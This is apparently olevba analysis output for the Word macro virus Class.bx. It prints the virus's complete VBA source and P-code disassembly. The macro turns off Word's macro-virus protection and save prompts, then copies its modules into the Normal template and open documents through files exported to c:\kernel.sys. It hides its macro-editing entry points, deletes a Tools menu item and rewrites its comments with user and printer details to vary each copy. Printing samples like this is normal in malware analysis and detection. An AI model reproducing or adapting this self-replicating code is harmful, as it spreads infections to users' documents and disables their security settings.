olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.bx
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.bx - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
ll.UserForm_Click
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Select Case Day(Now)
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Case 25 To 31
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
ll.Show
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Select
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Sub
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Sub ViewVBCode()
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Sub
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Sub ToolsMacro()
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Sub
-------------------------------------------------------------------------------
VBA MACRO ll.frm 
in file: Virus.MSWord.Class.bx - OLE stream: 'Macros/VBA/ll'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Sub UserForm_Click()
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
On Error GoTo out
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Options.VirusProtection = False
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Options.SaveNormalPrompt = False
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
Options.ConfirmConversions = False
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt > 0 And ad > 0 Then GoTo out
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt = 0 Then
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Set infect = NormalTemplate.VBProject.VBComponents
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Set host = ActiveDocument.VBProject.VBComponents
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 5, "select case day(now)"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 7, "case 25 to 31"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 9, Application.UserInitials & ".show"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).codemodule.replaceline 11, "end select"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).Name = infect.Item(1).Name
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(2).Name = Application.UserInitials
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(1).Export "c:\kernel.sys"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    host.Item(2).Export "c:\kernel2.sys"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End If
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
infect.Import ("c:\kernel2.sys")
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
infect.Item(1).codemodule.AddFromFile ("c:\kernel.sys")
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
With infect.Item(1).codemodule
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    For x = 1 To 4
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .deletelines 1
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Next x
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    If nt = 0 Then
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .insertlines 14, vbCr & "Sub ViewVBCode()"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .insertlines 16, vbCr & "End Sub"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .insertlines 18, vbCr & "Sub ToolsMacro()"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .insertlines 20, vbCr & "End Sub"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    CommandBars("tools").Controls("Templates and add-ins...").Delete
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    End If
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End With
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
With infect.Item(2).codemodule
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .deletelines 1
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Next x
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End With
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
With infect.Item(1).codemodule
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
    Next x
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End With
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
out:
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot
End Sub
'll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Class.bx
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 3377 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #2:
' 	Ld ll 
' 	ArgsMemCall UserForm_Click 0x0000 
' Line #3:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	SelectCase 
' Line #5:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #6:
' 	LitDI2 0x0019 
' 	LitDI2 0x001F 
' 	CaseTo 
' 	CaseDone 
' Line #7:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #8:
' 	Ld ll 
' 	ArgsMemCall Show 0x0000 
' Line #9:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #10:
' 	EndSelect 
' Line #11:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #12:
' 	EndSub 
' Line #13:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #14:
' 	FuncDefn (Sub ViewVBCode())
' Line #15:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #16:
' 	EndSub 
' Line #17:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #18:
' 	FuncDefn (Sub ToolsMacro())
' Line #19:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #20:
' 	EndSub 
' Macros/VBA/ll - 14714 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #1:
' 	FuncDefn (Sub UserForm_Click())
' Line #2:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #3:
' 	OnError out 
' Line #4:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #10:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #11:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St ad 
' Line #12:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #13:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St nt 
' Line #14:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #15:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #16:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #17:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #18:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #19:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set infect 
' Line #20:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #21:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set host 
' Line #22:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #23:
' 	LitDI2 0x0003 
' 	Ld Application 
' 	MemLd UserInitials 
' 	LitStr 0x000F ".UserForm_Click"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #24:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #25:
' 	LitDI2 0x0005 
' 	LitStr 0x0014 "select case day(now)"
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #26:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #27:
' 	LitDI2 0x0007 
' 	LitStr 0x000D "case 25 to 31"
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #28:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #29:
' 	LitDI2 0x0009 
' 	Ld Application 
' 	MemLd UserInitials 
' 	LitStr 0x0005 ".show"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #30:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #31:
' 	LitDI2 0x000B 
' 	LitStr 0x000A "end select"
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #32:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #33:
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #34:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #35:
' 	Ld Application 
' 	MemLd UserInitials 
' 	LitDI2 0x0002 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #36:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #37:
' 	LitStr 0x000D "c:\kernel.sys"
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #38:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #39:
' 	LitStr 0x000E "c:\kernel2.sys"
' 	LitDI2 0x0002 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #40:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #43:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set infect 
' 	EndIf 
' Line #44:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #45:
' 	LitStr 0x000E "c:\kernel2.sys"
' 	Paren 
' 	Ld infect 
' 	ArgsMemCall Import 0x0001 
' Line #46:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #47:
' 	LitStr 0x000D "c:\kernel.sys"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #48:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #49:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #50:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #51:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #52:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #53:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #54:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #55:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #57:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #58:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #59:
' 	LitDI2 0x000E 
' 	Ld vbCr 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	ArgsMemCallWith insertlines 0x0002 
' Line #60:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #61:
' 	LitDI2 0x0010 
' 	Ld vbCr 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	ArgsMemCallWith insertlines 0x0002 
' Line #62:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #63:
' 	LitDI2 0x0012 
' 	Ld vbCr 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Concat 
' 	ArgsMemCallWith insertlines 0x0002 
' Line #64:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #65:
' 	LitDI2 0x0014 
' 	Ld vbCr 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	ArgsMemCallWith insertlines 0x0002 
' Line #66:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #67:
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #68:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #71:
' 	EndWith 
' Line #72:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #73:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #74:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #75:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #76:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #77:
' 	StartWithExpr 
' 	LitDI2 0x0002 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #78:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #79:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #80:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #81:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #82:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #83:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #84:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #85:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #86:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #87:
' 	EndWith 
' Line #88:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #89:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #90:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #91:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #92:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #93:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #94:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #95:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #96:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #97:
' 	EndWith 
' Line #98:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #99:
' 	Label out 
' Line #100:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #101:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #102:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #103:
' 	EndSub 
' Line #104:
' 	QuoteRem 0x0000 0x0047 "ll6/25/99 11:41:07 PMPanasonic KX-P6100 GDI on KXPGDIClass.BX.Poly0.dot"
' Line #105:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Class.bx' - OLE stream: 'Macros/ll/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�DiWa�	
-------------------------------------------------------------------------------
